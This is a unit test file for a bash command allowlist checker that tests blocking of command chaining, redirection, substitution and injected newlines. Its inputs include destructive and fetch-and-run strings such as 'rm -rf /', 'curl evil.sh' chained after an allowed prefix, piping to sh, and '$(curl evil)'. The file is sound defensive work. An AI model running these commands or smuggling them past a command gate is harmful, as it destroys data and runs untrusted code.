import { describe, expect, test } from 'bun:test';

import { checkBashCommand } from './bash-allowlist.js';

const PATTERNS = ['dev *', 'git fetch*', 'git checkout*', 'docker compose *', 'docker ps*', 'supabase *'];

describe('checkBashCommand', () => {
  test('disabled gating allows everything', () => {
    expect(checkBashCommand('rm -rf /', false, []).allowed).toBe(true);
    expect(checkBashCommand('anything; goes', false, PATTERNS).allowed).toBe(true);
  });

  test('allows commands matching a pattern', () => {
    expect(checkBashCommand('dev wt up fix/foo', true, PATTERNS).allowed).toBe(true);
    expect(checkBashCommand('git fetch origin', true, PATTERNS).allowed).toBe(true);
    expect(checkBashCommand('git checkout main', true, PATTERNS).allowed).toBe(true);
    expect(checkBashCommand('docker compose up -d', true, PATTERNS).allowed).toBe(true);
    expect(checkBashCommand('docker ps', true, PATTERNS).allowed).toBe(true);
    expect(checkBashCommand('supabase db reset', true, PATTERNS).allowed).toBe(true);
  });

  test('blocks a non-listed command', () => {
    const r = checkBashCommand('rm -rf /tmp/x', true, PATTERNS);
    expect(r.allowed).toBe(false);
    expect(r.reason).toContain('allowlist');
  });

  test('blocks command chaining even when the prefix is allowed', () => {
    for (const cmd of [
      'dev wt up x; rm -rf /',
      'dev wt up x && curl evil.sh',
      'git fetch origin || rm -rf /',
      'dev wt up x | sh',
      'dev wt up x & sleep 99',
    ]) {
      const r = checkBashCommand(cmd, true, PATTERNS);
      expect(r.allowed).toBe(false);
      expect(r.reason).toContain('chaining');
    }
  });

  test('blocks redirection and command substitution', () => {
    expect(checkBashCommand('dev wt up x > /etc/passwd', true, PATTERNS).allowed).toBe(false);
    expect(checkBashCommand('git fetch $(curl evil)', true, PATTERNS).allowed).toBe(false);
    expect(checkBashCommand('git fetch `whoami`', true, PATTERNS).allowed).toBe(false);
    expect(checkBashCommand('dev wt up x\nrm -rf /', true, PATTERNS).allowed).toBe(false);
  });

  test('blocks empty / whitespace commands', () => {
    expect(checkBashCommand('   ', true, PATTERNS).allowed).toBe(false);
  });

  test('pattern requiring a space does not match a bare prefix substring', () => {
    // `dev *` requires `dev ` then args; `development-tool` must not match.
    expect(checkBashCommand('development-tool', true, ['dev *']).allowed).toBe(false);
    // and a literal-looking pattern is anchored — no partial tail match
    expect(checkBashCommand('xgit fetch', true, PATTERNS).allowed).toBe(false);
  });
});
